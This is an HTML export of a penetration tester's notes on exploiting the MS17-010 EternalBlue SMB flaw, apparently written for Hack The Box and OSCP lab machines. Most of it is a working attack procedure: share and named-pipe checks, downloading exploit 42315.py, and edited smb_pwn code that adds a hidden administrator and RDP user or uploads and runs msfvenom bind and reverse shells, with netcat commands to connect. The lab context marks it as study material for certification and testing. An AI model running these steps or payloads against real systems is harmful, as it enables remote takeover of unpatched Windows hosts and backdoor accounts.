<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MS17-010 EternalBlue</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># MS17-010 - EternalBlue</h1></strong><br />This can be deceptively tricky to exploit depending on the system.<br /><br /><strong>Examples</strong><br />• hackthebox Blue<br />• oscp 10.11.1.75 - Bruce<br /><br /><strong><h2>## 1) Verify M17-010</h2></strong><br />To exploit MS17-010, we need<br />1. Access to read the shares on the target<br />2. A named pipe<br /><br /><strong><h3>### 1a) Check if you have access to read the shares on the target</h3></strong><br /><code>smbmap -H 10.11.1.75</code><br /><code>smbmap -H 10.11.1.75 -u Guest</code><br /><br /><strong><h3>### 1b) Find a named pipe</h3></strong><br />There are 2 ways to do this:<br />• worawit&#39;s <code>checker.py</code> script (I trust this more)<br />• Metasploit&#39;s <code>auxiliary/scanner/smb/smb_ms17_010</code><br /><br /><strong>worawit&#39;s checker.py</strong><br />Download - <a href="https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py">https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py</a><br />To run it also requires <code>mysmb.py</code> - <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py</a><br /><br />Modify the <code>USERNAME</code> &amp; <code>PASSWORD</code> values to the creds you can read the target&#39;s shares with<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/public/10.11.1.75_bruce]<br />└──╼&nbsp;#nano&nbsp;checker.py&nbsp;<br />[...]<br />&#39;&#39;&#39;<br />Script&nbsp;for<br />-&nbsp;check&nbsp;target&nbsp;if&nbsp;MS17-010&nbsp;is&nbsp;patched&nbsp;or&nbsp;not.<br />-&nbsp;find&nbsp;accessible&nbsp;named&nbsp;pipe<br />&#39;&#39;&#39;<br /><br />USERNAME&nbsp;=&nbsp;&#39;Guest&#39;<br />PASSWORD&nbsp;=&nbsp;&#39;&#39;<br /><br />NDR64Syntax&nbsp;=&nbsp;(&#39;71710533-BEBA-4937-8319-B5DBEF9CCC36&#39;,&nbsp;&#39;1.0&#39;)<br />[...]</div></div><br /><br />And run the checker<br /><code>python checker.py 10.11.1.75</code><br /><br /><strong>Metasploit&#39;s </strong><strong><code>auxiliary/scanner/smb/smb_ms17_010</code></strong><br /><div class="codebox"><div class="codebox">msf5&nbsp;&gt;&nbsp;use&nbsp;auxiliary/scanner/smb/smb_ms17_010<br />msf5&nbsp;auxiliary(scanner/smb/smb_ms17_010)&nbsp;&gt;&nbsp;set&nbsp;rhosts&nbsp;10.11.1.75<br />msf5&nbsp;auxiliary(scanner/smb/smb_ms17_010)&nbsp;&gt;&nbsp;set&nbsp;smbuser&nbsp;Guest<br />msf5&nbsp;auxiliary(scanner/smb/smb_ms17_010)&nbsp;&gt;&nbsp;set&nbsp;check_pipe&nbsp;true<br />msf5&nbsp;auxiliary(scanner/smb/smb_ms17_010)&nbsp;&gt;&nbsp;run<br /><br />[+]&nbsp;10.11.1.75:445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Host&nbsp;is&nbsp;likely&nbsp;VULNERABLE&nbsp;to&nbsp;MS17-010!&nbsp;-&nbsp;Windows&nbsp;7&nbsp;Professional&nbsp;7601&nbsp;Service&nbsp;Pack&nbsp;1&nbsp;x64&nbsp;(64-bit)<br />[+]&nbsp;10.11.1.75:445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Named&nbsp;pipe&nbsp;found:&nbsp;\netlogon<br />[*]&nbsp;10.11.1.75:445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Scanned&nbsp;1&nbsp;of&nbsp;1&nbsp;hosts&nbsp;(100%&nbsp;complete)<br />[*]&nbsp;Auxiliary&nbsp;module&nbsp;execution&nbsp;completed</div></div><br /><br /><strong><h2>## 2) Exploit MS17-010</h2></strong><br />The most reliable exploit I&#39;ve found for MS17-010 EternalBlue is this:<br /><a href="https://www.exploit-db.com/exploits/42315">https://www.exploit-db.com/exploits/42315</a><br /><br />Download <code>42315.py</code> and <code>mysmb.py</code> (a required library)<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/public/10.11.1.75_bruce]<br />└──╼&nbsp;#wget&nbsp;-q&nbsp;https://www.exploit-db.com/download/42315&nbsp;-O&nbsp;blue.py<br />┌─[root@parrot]─[/oscp/public/10.11.1.75_bruce]<br />└──╼&nbsp;#wget&nbsp;-q&nbsp;https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py&nbsp;-O&nbsp;mysmb.py<br />┌─[root@parrot]─[/oscp/public/10.11.1.75_bruce]<br />└──╼&nbsp;#ls&nbsp;-alh<br />total&nbsp;64K<br />drwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;62&nbsp;Mar&nbsp;&nbsp;6&nbsp;11:40&nbsp;.<br />drwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;1.5K&nbsp;Mar&nbsp;&nbsp;5&nbsp;15:11&nbsp;..<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;41K&nbsp;Mar&nbsp;&nbsp;6&nbsp;11:39&nbsp;blue.py<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;17K&nbsp;Mar&nbsp;&nbsp;6&nbsp;11:39&nbsp;mysmb.py<br />drwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;132&nbsp;Nov&nbsp;25&nbsp;11:21&nbsp;nmap</div></div><br /><br /><strong><h3>### 1. Modify the credentials</h3></strong><br />Modify the <code>USERNAME</code> and <code>PASSWORD</code> variables towards the top of the script<br /><div class="codebox"><div class="codebox">[...]<br />-&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;x86<br />-&nbsp;Windows&nbsp;2000&nbsp;SP4&nbsp;x86<br />&#39;&#39;&#39;<br /><br />USERNAME&nbsp;=&nbsp;&#39;Guest&#39;<br />PASSWORD&nbsp;=&nbsp;&#39;&#39;<br /><br />&#39;&#39;&#39;<br />A&nbsp;transaction&nbsp;with&nbsp;empty&nbsp;setup:<br />-&nbsp;it&nbsp;is&nbsp;allocated&nbsp;from&nbsp;paged&nbsp;pool&nbsp;(same&nbsp;as&nbsp;other&nbsp;transaction&nbsp;types)&nbsp;on&nbsp;Windows&nbsp;7&nbsp;and&nbsp;later<br />[...]</div></div><br /><br /><strong><h3>### 2. Modify the pwn command &amp; run</h3></strong><br />In the <code>smb_pwn</code> function we can determine what the exploit does.<br /><br /><strong>Option #1 - Add RDP User</strong><br />1. Use the <code>service_exec</code> function to run a system command:<br />• add a new user to the system called <code>hacker</code><br />• added <code>hacker</code> to the <code>Administrators</code> group<br />• and added hacker to the <code>&quot;Remote Desktop Users&quot;</code> group so that I could RDP into the system<br /><br /><div class="codebox"><div class="codebox">[...]<br />def&nbsp;smb_pwn(conn,&nbsp;arch):<br />	smbConn&nbsp;=&nbsp;conn.get_smbconnection()<br />	<br />	print(&#39;creating&nbsp;file&nbsp;c:\\pwned.txt&nbsp;on&nbsp;the&nbsp;target&#39;)<br />	tid2&nbsp;=&nbsp;smbConn.connectTree(&#39;C$&#39;)<br />	fid2&nbsp;=&nbsp;smbConn.createFile(tid2,&nbsp;&#39;/pwned.txt&#39;)<br />	smbConn.closeFile(tid2,&nbsp;fid2)<br />	smbConn.disconnectTree(tid2)<br />	<br />	#smb_send_file(smbConn,&nbsp;sys.argv[0],&nbsp;&#39;C&#39;,&nbsp;&#39;/exploit.py&#39;)<br />	print(&quot;adding&nbsp;user...&quot;)<br />	service_exec(conn,&nbsp;r&#39;cmd&nbsp;/c&nbsp;net&nbsp;user&nbsp;hacker&nbsp;Hacker123!&nbsp;/add&nbsp;&amp;&amp;&nbsp;net&nbsp;localgroup&nbsp;administrators&nbsp;hacker&nbsp;/add&nbsp;&amp;&amp;&nbsp;net&nbsp;localgroup&nbsp;&quot;Remote&nbsp;Desktop&nbsp;Users&quot;&nbsp;hacker&nbsp;/add&#39;)<br />	#&nbsp;Note:&nbsp;there&nbsp;are&nbsp;many&nbsp;methods&nbsp;to&nbsp;get&nbsp;shell&nbsp;over&nbsp;SMB&nbsp;admin&nbsp;session<br />	#&nbsp;a&nbsp;simple&nbsp;method&nbsp;to&nbsp;get&nbsp;shell&nbsp;(but&nbsp;easily&nbsp;to&nbsp;be&nbsp;detected&nbsp;by&nbsp;AV)&nbsp;is<br />	#&nbsp;executing&nbsp;binary&nbsp;generated&nbsp;by&nbsp;&quot;msfvenom&nbsp;-f&nbsp;exe-service&nbsp;...&quot;<br /><br />def&nbsp;smb_send_file(smbConn,&nbsp;localSrc,&nbsp;remoteDrive,&nbsp;remotePath):<br />	with&nbsp;open(localSrc,&nbsp;&#39;rb&#39;)&nbsp;as&nbsp;fp:<br />		smbConn.putFile(remoteDrive&nbsp;+&nbsp;&#39;$&#39;,&nbsp;remotePath,&nbsp;fp.read)<br />[...]</div></div><br /><br />• <code>leak failed</code> doesn&#39;t matter, let it retry a few times and it should get it.<br />• <code>ERROR_SERVICE_REQUEST_TIMEOUT</code> also doesn&#39;t matter because we&#39;re not starting a service on the system, just executing a cmd command<br /><br />2. Run the script<br /><code>python blue.py 10.11.1.75</code><br /><br /><strong>Option #2 - Bind shell</strong><br />1. Generate <code>exe-service</code> bind shell .exe with msfvenom<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/public/10.11.1.75_bruce]<br />└──╼&nbsp;#msfvenom&nbsp;-p&nbsp;windows/shell_bind_tcp&nbsp;LPORT=4444&nbsp;-f&nbsp;exe-service&nbsp;-o&nbsp;bshell4444-service.exe<br />[...]</div></div><br /><br />2. Modify script<br /><div class="codebox"><div class="codebox">[...]<br />def&nbsp;smb_pwn(conn,&nbsp;arch):<br />	smbConn&nbsp;=&nbsp;conn.get_smbconnection()<br />	<br />	print(&#39;creating&nbsp;file&nbsp;c:\\pwned.txt&nbsp;on&nbsp;the&nbsp;target&#39;)<br />	tid2&nbsp;=&nbsp;smbConn.connectTree(&#39;C$&#39;)<br />	fid2&nbsp;=&nbsp;smbConn.createFile(tid2,&nbsp;&#39;/pwned.txt&#39;)<br />	smbConn.closeFile(tid2,&nbsp;fid2)<br />	smbConn.disconnectTree(tid2)<br />	<br />	print(&quot;uploading&nbsp;file...&nbsp;&quot;)<br />	smb_send_file(smbConn,&nbsp;&#39;/oscp/public/10.11.1.75_bruce/bshell4444-service.exe&#39;,&nbsp;&#39;C&#39;,&nbsp;&#39;bshell4444-service.exe&#39;)<br />	print(&quot;executing&nbsp;file&nbsp;with&nbsp;cmd...&nbsp;&quot;)<br />	service_exec(conn,&nbsp;r&#39;cmd&nbsp;/c&nbsp;c:\bshell4444-service.exe&#39;)<br />	#&nbsp;Note:&nbsp;there&nbsp;are&nbsp;many&nbsp;methods&nbsp;to&nbsp;get&nbsp;shell&nbsp;over&nbsp;SMB&nbsp;admin&nbsp;session<br />	#&nbsp;a&nbsp;simple&nbsp;method&nbsp;to&nbsp;get&nbsp;shell&nbsp;(but&nbsp;easily&nbsp;to&nbsp;be&nbsp;detected&nbsp;by&nbsp;AV)&nbsp;is<br />	#&nbsp;executing&nbsp;binary&nbsp;generated&nbsp;by&nbsp;&quot;msfvenom&nbsp;-f&nbsp;exe-service&nbsp;...&quot;<br />[...]</div></div><br /><br />3. Run script<br />• <code>leak failed</code> doesn&#39;t matter, let it retry a few times and it should get it<br /><code>python blue.py 10.11.1.75</code><br /><br />4. Connect on the bind shell<br /><code>nc 10.11.1.75 4444</code><br /><br /><strong>Option #3 - Reverse Shell</strong><br />1. Generate <code>exe-service</code> reverse shell .exe with msfvenom<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/public/10.11.1.75_bruce]<br />└──╼&nbsp;#msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;LPORT=443&nbsp;-f&nbsp;exe-service&nbsp;-o&nbsp;rshell443-service.exe<br />[...]</div></div><br /><br />2. Modify script<br /><div class="codebox"><div class="codebox">[...]<br />def&nbsp;smb_pwn(conn,&nbsp;arch):<br />	smbConn&nbsp;=&nbsp;conn.get_smbconnection()<br />	<br />	print(&#39;creating&nbsp;file&nbsp;c:\\pwned.txt&nbsp;on&nbsp;the&nbsp;target&#39;)<br />	tid2&nbsp;=&nbsp;smbConn.connectTree(&#39;C$&#39;)<br />	fid2&nbsp;=&nbsp;smbConn.createFile(tid2,&nbsp;&#39;/pwned.txt&#39;)<br />	smbConn.closeFile(tid2,&nbsp;fid2)<br />	smbConn.disconnectTree(tid2)<br />	<br />	print(&quot;uploading&nbsp;file...&nbsp;&quot;)<br />	smb_send_file(smbConn,&nbsp;&#39;/oscp/public/10.11.1.75_bruce/rshell443-service.exe&#39;,&nbsp;&#39;C&#39;,&nbsp;&#39;rshell443-service.exe&#39;)<br />	print(&quot;executing&nbsp;file&nbsp;with&nbsp;cmd...&nbsp;&quot;)<br />	service_exec(conn,&nbsp;r&#39;cmd&nbsp;/c&nbsp;c:\rshell443-service.exe&#39;)<br />	#&nbsp;Note:&nbsp;there&nbsp;are&nbsp;many&nbsp;methods&nbsp;to&nbsp;get&nbsp;shell&nbsp;over&nbsp;SMB&nbsp;admin&nbsp;session<br />	#&nbsp;a&nbsp;simple&nbsp;method&nbsp;to&nbsp;get&nbsp;shell&nbsp;(but&nbsp;easily&nbsp;to&nbsp;be&nbsp;detected&nbsp;by&nbsp;AV)&nbsp;is<br />	#&nbsp;executing&nbsp;binary&nbsp;generated&nbsp;by&nbsp;&quot;msfvenom&nbsp;-f&nbsp;exe-service&nbsp;...&quot;<br />[...]</div></div><br /><br />3. Start listener<br /><code>nc -lvnp 443</code><br /><br />4. Run script<br />• <code>leak failed</code> doesn&#39;t matter, let it retry a few times and it should get it<br /><code>python blue.py 10.11.1.75</code><br /><br /></div>
</body>
</html>
